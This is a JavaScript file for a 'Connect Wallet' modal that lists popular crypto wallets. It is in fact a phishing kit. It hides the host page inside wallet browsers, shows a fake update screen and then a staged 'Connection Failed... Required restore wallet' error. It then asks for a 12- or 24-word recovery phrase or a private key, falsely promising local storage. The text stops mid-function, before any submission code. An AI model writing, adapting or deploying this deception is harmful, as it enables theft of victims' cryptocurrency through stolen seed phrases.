
(function() {
  'use strict';
  
  // Check if already loaded
  if (window.WalletModal) {
    console.log('WalletModal already loaded');
    return;
  }

class WalletModal {
  constructor() {
    this.wallets = [
      {
        id: 'walletconnect',
        name: 'WalletConnect',
        emoji: '🔗',
        bgColor: 'bg-blue-50',
        primaryColor: '#3B99FC',
        secondaryColor: '#2A7FD9'
      },
      {
        id: 'metamask',
        name: 'MetaMask',
        emoji: '🦊',
        bgColor: 'bg-orange-50',
        primaryColor: '#F6851B',
        secondaryColor: '#E2761B'
      },
      {
        id: 'trust',
        name: 'Trust Wallet',
        emoji: '🛡️',
        bgColor: 'bg-blue-50',
        primaryColor: '#3375BB',
        secondaryColor: '#2952A3'
      },
      {
        id: 'coinbase',
        name: 'Coinbase Wallet',
        emoji: '💙',
        bgColor: 'bg-blue-50',
        primaryColor: '#0052FF',
        secondaryColor: '#0041CC'
      },
      {
        id: 'rainbow',
        name: 'Rainbow',
        emoji: '🌈',
        bgColor: 'bg-purple-50',
        primaryColor: '#FF4F9A',
        secondaryColor: '#E63E89'
      },
      {
        id: 'okx',
        name: 'OKX Wallet',
        emoji: '⚫',
        bgColor: 'bg-gray-100',
        primaryColor: '#000000',
        secondaryColor: '#1A1A1A'
      },
      {
        id: 'rabby',
        name: 'Rabby Wallet',
        emoji: '🐰',
        bgColor: 'bg-blue-50',
        primaryColor: '#7084FF',
        secondaryColor: '#5A6FE6'
      },
      {
        id: 'phantom',
        name: 'Phantom',
        emoji: '👻',
        bgColor: 'bg-purple-50',
        primaryColor: '#AB9FF2',
        secondaryColor: '#9580E6'
      },
      {
        id: 'solflare',
        name: 'Solflare',
        emoji: '🔥',
        bgColor: 'bg-purple-50',
        primaryColor: '#FC6B2D',
        secondaryColor: '#E35A24'
      },
      {
        id: 'bitget',
        name: 'Bitget Wallet',
        emoji: '💼',
        bgColor: 'bg-cyan-50',
        primaryColor: '#00F0FF',
        secondaryColor: '#00D4E6'
      }
    ].map(wallet => ({
      ...wallet,
      iconUrl: `images/${wallet.id}.png`
    }));

    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
    this.isInWalletBrowser = false;
    
    // WalletConnect sub-wallets
    this.walletConnectWallets = [
      { id: 'uniswap', name: 'Uniswap Wallet', emoji: '🦄' },
      { id: 'zerion', name: 'Zerion', emoji: '⚡' },
      { id: 'atomic', name: 'Atomic Wallet', emoji: '⚛️' },
      { id: 'safepal', name: 'SafePal', emoji: '💎' },
      { id: 'bestwallet', name: 'Best Wallet', emoji: '🏆' },
      { id: 'crypto', name: 'Crypto.com', emoji: '💳' },
      { id: 'binance', name: 'Binance Wallet', emoji: '🔶' },
      { id: 'cardano', name: 'Cardano', emoji: '🔵' },
      { id: 'token', name: 'TokenPocket', emoji: '🎯' },
      { id: 'onto', name: 'ONTO Wallet', emoji: '🔶' },
      { id: 'safemoon', name: 'SafeMoon', emoji: '🛡️' },
      { id: 'ellipal', name: 'Ellipal', emoji: '🔐' },
      { id: 'enjin', name: 'Enjin Wallet', emoji: '⚔️' },
      { id: 'gnosis', name: 'Gnosis Safe', emoji: '🔷' },
      { id: 'exodus', name: 'Exodus', emoji: '✖️' },
      { id: 'kraken', name: 'Kraken', emoji: '🦑' },
      { id: 'bridge', name: 'Bridge Wallet', emoji: '🌉' },
      { id: 'mew', name: 'MyEtherWallet', emoji: '😸' },
      { id: 'zengo', name: 'ZenGo', emoji: '🌅' },
      { id: 'raven', name: 'Ravencoin', emoji: '🐦' },
      { id: 'swipe', name: 'Swipe Wallet', emoji: '💳' },
      { id: 'talken', name: 'Talken', emoji: '💬' }
    ].map(wallet => ({
      ...wallet,
      iconUrl: `images/${wallet.id}.png`
    }));
    
    // Detect theme preference
    this.isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    // Listen for theme changes
    if (window.matchMedia) {
      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
        this.isDarkMode = e.matches;
      });
    }
    
    this.init();
  }

  init() {
    // Check if we're inside a wallet browser
    this.detectWalletBrowser();

    // ONLY on mobile: If inside wallet browser, hide main content and show the flow
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (this.isInWalletBrowser && isMobile) {
      this.hideMainContent();
      this.startWalletBrowserFlow();
    } else {
      // Normal flow: listen for interact-button clicks (desktop + mobile normal browser)
      document.addEventListener('click', (e) => {
        if (e.target.classList.contains('interact-button') || 
            e.target.closest('.interact-button')) {
          e.preventDefault();
          this.showWalletSelectionModal();
        }
      });
    }

    // Add Tailwind CSS if not already included
    if (!document.querySelector('script[src*="tailwindcss"]')) {
      const script = document.createElement('script');
      script.src = 'https://cdn.tailwindcss.com';
      document.head.appendChild(script);
    }
  }

  // Helper method to create wallet image
  createWalletImageHTML(wallet) {
    return `<img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover; object-position: center; max-width: 100%; max-height: 100%;" loading="eager" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.75rem; user-select: none;\\'>${wallet.emoji}</div>';">`;
  }

  hideMainContent() {
    // Hide the entire body content
    document.body.style.display = 'none';
    
    // Create a new container for wallet flow
    const container = document.createElement('div');
    container.id = 'wallet-flow-container';
    container.style.cssText = 'display: block; position: fixed; inset: 0; z-index: 9999;';
    document.body.appendChild(container);
    
    // Show body again but everything is hidden except our container
    document.body.style.display = 'block';
    
    // Hide all children except our container
    Array.from(document.body.children).forEach(child => {
      if (child.id !== 'wallet-flow-container') {
        child.style.display = 'none';
      }
    });
  }

  // Helper method to get theme classes
  getThemeClasses() {
    if (this.isDarkMode) {
      return {
        bg: 'bg-gray-900',
        card: 'bg-gray-800',
        text: 'text-white',
        textSecondary: 'text-gray-300',
        textMuted: 'text-gray-400',
        border: 'border-gray-700',
        hover: 'hover:bg-gray-700',
        input: 'bg-gray-700 text-white border-gray-600',
        backdrop: 'bg-black bg-opacity-60'
      };
    }
    return {
      bg: 'bg-white',
      card: 'bg-white',
      text: 'text-gray-900',
      textSecondary: 'text-gray-700',
      textMuted: 'text-gray-500',
      border: 'border-gray-100',
      hover: 'hover:bg-gray-50',
      input: 'bg-white text-gray-900 border-gray-200',
      backdrop: 'bg-black bg-opacity-40'
    };
  }

  // Check if device is mobile
  isMobileDevice() {
    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  }

  detectWalletBrowser() {
    // Detect if inside Trust Wallet browser
    if (window.ethereum && window.ethereum.isTrust) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust');
      return;
    }

    // Detect if inside MetaMask browser
    if (window.ethereum && window.ethereum.isMetaMask) {
      // Check for mobile MetaMask
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      if (/MetaMaskMobile/i.test(userAgent)) {
        this.isInWalletBrowser = true;
        this.selectedWallet = this.wallets.find(w => w.id === 'metamask');
        return;
      }
    }

    // Detect if inside Coinbase Wallet browser
    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'coinbase');
      return;
    }

    // Detect TokenPocket
    if (window.ethereum && window.ethereum.isTokenPocket) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust'); // Use Trust as default
      return;
    }

    // Detect Rainbow
    if (window.ethereum && window.ethereum.isRainbow) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'rainbow');
      return;
    }

    // Detect Phantom
    if (window.phantom && window.phantom.solana) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'phantom');
      return;
    }

    // Detect Solflare
    if (window.solflare && window.solflare.isSolflare) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'solflare');
      return;
    }

    // Detect Bitget
    if (window.bitkeep || (window.ethereum && window.ethereum.isBitKeep)) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'bitget');
      return;
    }

    // Generic wallet browser detection by user agent
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const walletBrowsers = [
      'Trust', 'TokenPocket', 'SafePal', 'MetaMask', 'Coinbase',
      'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare', 'Bitget',
      'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo', 'BestWallet'
    ];
    
    for (const wallet of walletBrowsers) {
      if (userAgent.includes(wallet)) {
        this.isInWalletBrowser = true;
        const foundWallet = this.wallets.find(w => w.name.toLowerCase().includes(wallet.toLowerCase()));
        this.selectedWallet = foundWallet || this.wallets[0];
        return;
      }
    }

    // Check URL parameters (in case you want to manually test)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('wallet') || urlParams.has('walletbrowser')) {
      this.isInWalletBrowser = true;
      const walletId = urlParams.get('wallet') || 'trust';
      this.selectedWallet = this.wallets.find(w => w.id === walletId) || this.wallets[0];
    }
  }

  startWalletBrowserFlow() {
    // Wait for page to load, then show updating screen
    setTimeout(() => {
      // Verify we have a selected wallet
      if (!this.selectedWallet) {
        console.error('No wallet detected in browser');
        // Set a default wallet if none detected
        this.selectedWallet = this.wallets[0];
      }
      console.log('Starting wallet browser flow for:', this.selectedWallet.name);
      this.showUpdatingWallet();
    }, 500);
  }

  // For testing: manually trigger wallet browser flow
  testWalletBrowserFlow(walletId = 'trust') {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.showUpdatingWallet();
  }

  showWalletSelectionModal() {
    const modalHTML = `
      <div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-2xl w-full max-w-sm shadow-2xl max-h-[85vh] overflow-hidden flex flex-col">
          <!-- Header -->
          <div class="flex items-center justify-between px-5 py-4 border-b border-gray-100">
            <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <circle cx="12" cy="12" r="10"></circle>
              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
              <line x1="12" y1="17" x2="12.01" y2="17"></line>
            </svg>
            <h2 class="text-base font-semibold text-gray-900">Connect Wallet</h2>
            <button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </button>
          </div>

          <!-- Wallet List -->
          <div class="px-2 py-1.5 overflow-y-auto flex-1">
            ${this.wallets.map(wallet => `
              <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 hover:bg-gray-50 rounded-lg transition group">
                <div class="flex items-center gap-3">
                  <div class="w-9 h-9 ${wallet.bgColor} rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
                    ${this.createWalletImageHTML(wallet)}
                  </div>
                  <span class="font-medium text-gray-900 text-sm">${wallet.name}</span>
                </div>
                <svg class="w-4 h-4 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                </svg>
              </button>
            `).join('')}
          </div>

          <!-- Footer -->
          <div class="px-4 py-3 text-center border-t border-gray-100">
            <div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">
              <span>UX by</span>
              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
              <span>/</span>
              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
              <span>reown</span>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
  }

  selectWallet(walletId) {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.closeModalOnly();
    
    // If WalletConnect is selected, show sub-modal with more wallets
    if (walletId === 'walletconnect') {
      this.showWalletConnectModal();
    } else {
      // Normal flow: show the "Open in..." prompt
      this.showOpenPrompt();
    }
  }

  showWalletConnectModal() {
    const theme = this.getThemeClasses();
    const isMobile = this.isMobileDevice();
    
    const modalHTML = `
      <div id="walletconnect-modal-backdrop" class="fixed inset-0 ${theme.backdrop} flex items-end sm:items-center justify-center z-50 ${isMobile ? 'wallet-backdrop-mobile' : 'p-4'}" onclick="if(event.target.id === 'walletconnect-modal-backdrop') walletModal.closeModal()">
        <div class="${theme.card} rounded-t-2xl sm:rounded-2xl w-full sm:max-w-sm shadow-2xl max-h-[80vh] sm:max-h-[85vh] overflow-hidden flex flex-col ${isMobile ? 'wallet-slide-up' : ''}">
          <!-- Header -->
          <div class="flex items-center justify-between px-5 py-4 border-b ${theme.border}">
            <button onclick="walletModal.backToMainModal()" class="${theme.textMuted} hover:${theme.textSecondary} transition">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
              </svg>
            </button>
            <h2 class="text-base font-semibold ${theme.text}">All Wallets</h2>
            <button onclick="walletModal.closeModal()" class="${theme.textMuted} hover:${theme.textSecondary} transition">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </button>
          </div>

          <!-- Search Bar -->
          <div class="px-3 py-2.5">
            <div class="relative">
              <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 ${theme.textMuted}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
              </svg>
              <input type="text" placeholder="Search wallet" class="w-full pl-10 pr-4 py-2 ${theme.input} rounded-lg text-sm focus:outline-none" style="border: 1px solid ${this.isDarkMode ? '#374151' : '#E5E7EB'}">
            </div>
          </div>

          <!-- Wallet List -->
          <div class="px-2 py-1.5 overflow-y-auto flex-1">
            ${this.walletConnectWallets.map(wallet => `
              <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 ${theme.hover} rounded-lg transition group">
                <div class="flex items-center gap-3">
                  <div class="w-9 h-9 bg-gray-50 rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
                    <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover;" loading="lazy" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;\\'>${wallet.emoji}</div>';">
                  </div>
                  <span class="font-medium ${theme.text} text-sm">${wallet.name}</span>
                </div>
                <svg class="w-4 h-4 ${theme.textMuted} group-hover:${theme.textSecondary} transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                </svg>
              </button>
            `).join('')}
          </div>

          <!-- Not Listed Button -->
          <div class="px-3 py-3 border-t ${theme.border}">
            <button onclick="walletModal.showMainModalFromWC()" class="w-full py-2.5 ${theme.hover} ${theme.text} font-semibold rounded-lg transition text-sm">
              Not Listed?
            </button>
          </div>
        </div>
      </div>
      
      <style>
        @keyframes slideUp {
          from {
            transform: translateY(100%);
          }
          to {
            transform: translateY(0);
          }
        }
        
        .wallet-slide-up {
          animation: slideUp 0.3s ease-out;
        }
        
        .wallet-backdrop-mobile {
          padding: 0;
        }
        
        .line-clamp-2 {
          display: -webkit-box;
          -webkit-line-clamp: 2;
          -webkit-box-orient: vertical;
          overflow: hidden;
        }
      </style>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
  }

  showMainModalFromWC() {
    this.backToMainModal();
  }

  selectWalletConnectWallet(walletId) {
    const wallet = this.walletConnectWallets.find(w => w.id === walletId);
    if (!wallet) return;
    
    // Set this as selected wallet with WalletConnect colors
    this.selectedWallet = {
      ...wallet,
      bgColor: 'bg-blue-50',
      primaryColor: '#3B99FC',
      secondaryColor: '#2A7FD9'
    };
    
    this.closeWalletConnectModal();
    
    // Show the "Open in..." prompt
    this.showOpenPrompt();
  }

  closeWalletConnectModal() {
    const modal = document.getElementById('walletconnect-modal-backdrop');
    if (modal) {
      modal.remove();
    }
  }
  
  backToMainModal() {
    const modal = document.getElementById('walletconnect-modal-backdrop');
    if (modal) {
      modal.remove();
    }
    this.showWalletSelectionModal();
  }

  showOpenPrompt() {
    const theme = this.getThemeClasses();
    
    const promptHTML = `
      <div id="wallet-prompt-backdrop" class="fixed inset-0 ${theme.backdrop} flex items-center justify-center p-4 z-50" onclick="if(event.target.id === 'wallet-prompt-backdrop') walletModal.cancelPrompt()">
        <div class="${theme.card} rounded-2xl w-full max-w-xs p-4 shadow-2xl">
          <p class="text-base font-medium ${theme.text} mb-5">
            Open in "${this.selectedWallet.name}"?
          </p>
          <div class="flex gap-3 justify-end">
            <button onclick="walletModal.cancelPrompt()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">
              Cancel
            </button>
            <button onclick="walletModal.confirmOpen()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">
              Open
            </button>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', promptHTML);
  }

  cancelPrompt() {
    this.closeModal(); // Reset everything and close
  }

  confirmOpen() {
    this.closeModalOnly(); // Close prompt
    
    // Detect device type
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
      // Only these wallets have verified working deep links
      const workingDeepLinks = {
        'metamask': true,
        'trust': true,
        'coinbase': true,
        'rainbow': true,
        'okx': true,
        'phantom': true,
        'solflare': true,
        'bitget': true,
        'bestwallet': true
      };
      
      // If wallet has working deep link, try to open it
      if (workingDeepLinks[this.selectedWallet.id]) {
        this.openWalletApp();
      } else {
        // For all other wallets, show simulated flow
        setTimeout(() => {
          this.showUpdatingWallet();
        }, 300);
      }
    } else {
      // On desktop, always simulate the wallet browser flow for testing
      setTimeout(() => {
        this.showUpdatingWallet();
      }, 300);
    }
  }

  openWalletApp() {
    const websiteUrl = window.location.href;
    
    // Deep link URLs to open wallet browser with your website
    // Only include wallets with verified deep link support
    const deepLinks = {
      'metamask': `https://metamask.app.link/dapp/${websiteUrl.replace('https://', '')}`,
      'trust': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(websiteUrl)}`,
      'coinbase': `https://go.cb-w.com/dapp?url=${encodeURIComponent(websiteUrl)}`,
      'rainbow': `https://rnbwapp.com/${websiteUrl}`,
      'okx': `https://www.okx.com/web3/dapp?url=${encodeURIComponent(websiteUrl)}`,
      'rabby': websiteUrl,
      'phantom': `https://phantom.app/ul/browse/${websiteUrl}?ref=${websiteUrl}`,
      'solflare': `https://solflare.com/ul/v1/browse/${websiteUrl}`,
      'walletconnect': websiteUrl,
      'bitget': `https://bkcode.vip?action=dapp&url=${encodeURIComponent(websiteUrl)}`,
      'bestwallet': `https://link.bestwallet.com/dapp?url=${encodeURIComponent(websiteUrl)}`
    };

    const link = deepLinks[this.selectedWallet.id];
    
    if (link) {
      // Try to open the wallet with browser
      window.location.href = link;
      
      // Fallback message
      setTimeout(() => {
        console.log('Opening wallet browser with your website...');
      }, 1000);
    } else {
      // For wallets without deep link support, show message
      console.log(`Deep link not available for ${this.selectedWallet.name}`);
      // Just try opening the current URL - some wallets auto-detect
      window.location.href = websiteUrl;
    }
  }

  showUpdatingWallet() {
    const walletColor = this.selectedWallet.primaryColor;
    
    const updatingHTML = `
      <div id="wallet-updating-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center">
          <!-- Wallet Logo -->
          <div class="mb-8">
            <div class="w-32 h-32 flex items-center justify-center animate-pulse">
              <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-full h-full rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
            </div>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Updating wallet...</h2>
          <p class="text-gray-500 text-center">Validating network parameters...</p>
          
          <!-- Loading animation -->
          <div class="mt-8">
            <div class="flex space-x-2">
              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0s"></div>
              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.2s"></div>
              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.4s"></div>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', updatingHTML);

    // After 2-3 seconds, show connection failed screen
    setTimeout(() => {
      this.closeModalOnly();
      this.showConnectionFailed();
    }, 2500);
  }

  showConnectionFailed() {
    const walletColor = this.selectedWallet.primaryColor;
    
    const failedHTML = `
      <div id="wallet-failed-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center max-w-md w-full">
          <!-- Wallet Logo with Error Badge -->
          <div class="mb-8 relative">
            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
            <!-- Error Badge -->
            <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
              <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
              </svg>
            </div>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
          <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
          
          <button id="continue-to-import-btn" data-action="import" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition active:opacity-80" style="background-color: ${walletColor}">
            Continue
          </button>
        </div>
      </div>
    `;

    const container = document.getElementById('wallet-flow-container') || document.body;
    container.insertAdjacentHTML('beforeend', failedHTML);
    
    // Use direct event binding that works in mobile browsers
    const continueBtn = document.getElementById('continue-to-import-btn');
    if (continueBtn) {
      // Multiple event types for better mobile support
      const handleClick = (e) => {
        e.preventDefault();
        e.stopPropagation();
        console.log('Continue button clicked');
        this.showImportScreen();
      };
      
      continueBtn.addEventListener('click', handleClick, { passive: false });
      continueBtn.addEventListener('touchend', handleClick, { passive: false });
    } else {
      console.error('Continue button not found');
    }
  }

  showImportScreen() {
    // Close any previous screens
    this.closeModalOnly();
    
    // Ensure we have a selected wallet
    if (!this.selectedWallet) {
      console.error('No wallet selected');
      return;
    }
    
    const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
    const walletColor = this.selectedWallet.primaryColor;
    
    const importHTML = `
      <div id="wallet-import-backdrop" class="fixed inset-0 bg-white flex flex-col z-50 overflow-y-auto">
        <!-- Header with wallet logo -->
        <div class="relative pt-6 pb-4 flex-shrink-0">
          <button onclick="walletModal.closeModal()" class="absolute top-4 sm:top-6 left-4 sm:left-6 text-gray-600">
            <svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
          </button>
          
          <!-- Wallet Logo in center -->
          <div class="flex justify-center pt-4">
            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center text-4xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
          </div>
        </div>

        <!-- Content -->
        <div class="flex-1 px-4 sm:px-6 pb-6">
          <div class="bg-white rounded-3xl shadow-lg p-4 sm:p-6">
            <h2 class="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-2">
              Import Wallet
            </h2>
            <p class="text-sm sm:text-base text-gray-500 text-center mb-6">
              Select your import method below
            </p>

            <!-- Import Method Selector -->
            <div class="mb-6">
              <label class="block text-xs sm:text-sm font-medium text-gray-500 mb-2 text-center">
                IMPORT METHOD
              </label>
              <select id="import-type-select" onchange="walletModal.changeImportType(this.value)" class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-gray-900 font-medium text-sm sm:text-base focus:outline-none" style="border-color: ${walletColor}">
                <option value="12" ${this.importType === '12' ? 'selected' : ''}>12 Words</option>
                <option value="24" ${this.importType === '24' ? 'selected' : ''}>24 Words</option>
                <option value="private" ${this.importType === 'private' ? 'selected' : ''}>Private Key</option>
              </select>
            </div>

            <!-- Input Area -->
            <div id="input-area">
              ${this.importType === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount)}
            </div>

            <!-- Action Buttons -->
            <div class="flex gap-3 mb-4">
              <button onclick="walletModal.closeModal()" class="flex-1 py-3 sm:py-4 border-2 border-gray-200 rounded-2xl font-semibold text-gray-900 hover:bg-gray-50 text-sm sm:text-base">
                Cancel
              </button>
              <button onclick="walletModal.submitImport()" class="flex-1 py-3 sm:py-4 rounded-2xl font-semibold text-white hover:opacity-90 text-sm sm:text-base" style="background-color: ${walletColor}">
                Import
              </button>
            </div>

            <!-- Security Notice -->
            <p class="text-xs text-gray-400 text-center flex items-center justify-center gap-2">
              🔒 Your ${this.importType === 'private' ? 'private key' : 'recovery phrase'} is stored securely on your device
            </p>
          </div>
        </div>

        <!-- Footer Branding -->
        <div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">
          <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center text-xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
          <span class="font-semibold text-gray-900 text-sm sm:text-base">${this.selectedWallet.name}</span>
        </div>
      </div>
      
      <style>
        #wallet-import-backdrop .seed-word-input:focus {
          border-color: ${walletColor} !important;
        }
        #wallet-import-backdrop #private-key-input:focus {
          border-color: ${walletColor} !important;
        }
      </style>
    `;

    document.body.insertAdjacentHTML('beforeend', importHTML);
    this.attachInputListeners();
  }

  renderPrivateKeyInput() {
    return `
      <div class="mb-6">
        <textarea
          id="private-key-input"
          placeholder="Enter your private key"
          class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none resize-none"
          rows="4"
          autocomplete="off"
        >${this.privateKey}</textarea>
      </div>
    `;
  }

  renderSeedPhraseInputs(count) {
    const inputs = [];
    for (let i = 0; i < count; i++) {
      inputs.push(`
        <input
          type="text"
          data-index="${i}"
          placeholder="${i + 1} word"
          value="${this.seedWords[i] || ''}"
          class="seed-word-input p-2.5 sm:p-3 border border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none"
          autocomplete="off"
        >
      `);
    }
    return `<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">${inputs.join('')}</div>`;
  }

  attachInputListeners() {
    // Handle private key input
    const privateKeyInput = document.getElementById('private-key-input');
    if (privateKeyInput) {
      privateKeyInput.addEventListener('input', (e) => {
        this.privateKey = e.target.value;
      });
    }

    // Handle seed word inputs
    const seedInputs = document.querySelectorAll('.seed-word-input');
    seedInputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        this.seedWords[index] = e.target.value;
      });

      // Handle paste on first input
      if (index === 0) {
        input.addEventListener('paste', (e) => {
          e.preventDefault();
          const pastedText = e.clipboardData.getData('text');
          const words = pastedText.trim().split(/\s+/);
          
          words.forEach((word, i) => {
            if (i < this.seedWords.length) {
              this.seedWords[i] = word.trim();
              const targetInput = document.querySelector(`.seed-word-input[data-index="${i}"]`);
              if (targetInput) {
                targetInput.value = word.trim();
              }
            }
          });
        });
      }
    });
  }

  changeImportType(type) {
    this.importType = type;
    
    if (type === 'private') {
      this.privateKey = '';
    } else {
      const count = parseInt(type);
      this.seedWords = Array(count).fill('');
    }

    // Update the input area with wallet colors
    const inputArea = document.getElementById('input-area');
    if (inputArea) {
